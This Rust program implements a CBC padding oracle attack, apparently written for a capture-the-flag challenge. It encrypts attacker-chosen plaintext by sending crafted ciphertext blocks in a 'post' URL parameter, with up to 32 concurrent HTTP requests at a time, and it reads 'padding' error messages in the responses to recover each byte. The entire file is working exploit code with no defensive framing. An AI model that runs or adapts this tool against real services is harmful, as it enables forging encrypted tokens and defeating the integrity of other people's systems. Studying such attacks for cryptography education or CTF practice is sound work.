use futures::stream;
use futures::StreamExt;
use reqwest::Client;
use std::time::Duration;
use base64::{encode};
use std::env;

mod error;
use error::Error;

const BLOCK_SIZE: usize = 16;

fn main() {
    let args: Vec<String> = env::args().collect();
    let endpoint = &args[1];
    let plaintext = &args[2];

    let http_timeout = Duration::from_secs(10);
    let http_client = Client::builder().timeout(http_timeout).build().expect("Building HTTP client");

    let extra =  [41_u8; BLOCK_SIZE];
    let mut plaintext = plaintext.as_bytes().to_vec();
    let mut ciphertext: Vec<[u8; 16]> = Vec::new();
    let required_padding = BLOCK_SIZE - (plaintext.len() % BLOCK_SIZE);
    plaintext.extend((0..required_padding).map(|_| required_padding as u8));
    let blocks = plaintext.len() / BLOCK_SIZE;

    println!("Plaintext size: {}", &plaintext.len());
    println!("Plaintext: {:?}", &plaintext);
    println!("Blocks: {}", &blocks);

    let mut next_block = extra;
    ciphertext.push(extra);

    plaintext.chunks_exact(BLOCK_SIZE).rev().for_each(|current_block| {
        next_block = find_encrypted_block(&http_client, endpoint, current_block, &next_block);
        ciphertext.push(next_block);
    });

    let result = ciphertext.iter().rev().flatten().copied().collect::<Vec<u8>>();
    println!("Ciphertext: {}", encode_base64(&result));
}

fn find_encrypted_block(http_client: &Client, endpoint: &str, block: &[u8], next_block: &[u8]) -> [u8; BLOCK_SIZE] {
    let mut result_ciphertext = [0_u8; BLOCK_SIZE];

    (0..BLOCK_SIZE).rev().for_each(|byte_pos|  {
        result_ciphertext[byte_pos] = find_encrypted_byte(http_client, endpoint, &result_ciphertext, next_block, byte_pos);
    });

    (0..BLOCK_SIZE).for_each(|i| result_ciphertext[i] ^= block[i]);

    result_ciphertext
}

fn find_encrypted_byte(http_client: &Client, endpoint: &str,result_ciphertext: &[u8], next_block: &[u8], byte_pos: usize) -> u8 {
    let padding_value = BLOCK_SIZE - byte_pos;
    let mut block = [0_u8; BLOCK_SIZE];

    for padding_index in byte_pos..BLOCK_SIZE {
        block[padding_index] = result_ciphertext[padding_index] ^ padding_value as u8 ;
    }

    if let Some(byte) = find_candidate(http_client, endpoint, &mut block, next_block, byte_pos) {
        byte ^ padding_value as u8
    } else {
        panic!("Failed to find encrypted byte");
    }
}

pub fn find_candidate(http_client: &Client, endpoint: &str, block: &mut [u8], next_block: &[u8], position: usize) -> Option<u8> {
    let runtime = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .expect("Building tokio's runtime");

    runtime.block_on(async move {
        let requests_concurrency = 32;

        stream::iter(0..=255_u8)
            .map(|byte| {
                block[position] = byte;

                let http_client = http_client.clone();
                let candidate = [block, next_block].concat();
                let endpoint = format!("{}/?post={}", endpoint, encode_base64(&candidate));

                async move {
                    match test_candidate(&http_client, &endpoint, byte).await {
                        Ok(Some(valid_byte)) => {
                            Some(valid_byte)
                        },
                        Ok(None) => None,
                        Err(err) => {
                            println!("Error: {}", err);
                            None
                        }
                    }
                }
            })
            .buffer_unordered(requests_concurrency)
            .filter_map(|candidate| async move { candidate })
            .take(1)
            .collect::<Vec<_>>()
            .await
            .first()
            .copied()
    })
}

fn encode_base64(bytes: &[u8]) -> String {
    encode(bytes)
        .replace('=', "~")
        .replace('/', "!")
        .replace('+',"-")
}

pub async fn test_candidate(http_client: &Client, endpoint: &str, byte: u8) -> Result<Option<u8>, Error> {
    let res = http_client.get(endpoint).send().await?;

    if !res.status().is_success() {
        println!("Failed to make HTTP call");
        return Ok(None);
    }

    let body = res.text().await?;

    if body.contains("Padding") || body.contains("padding") {
        return Ok(None)
    }

    Ok(Some(byte))
}
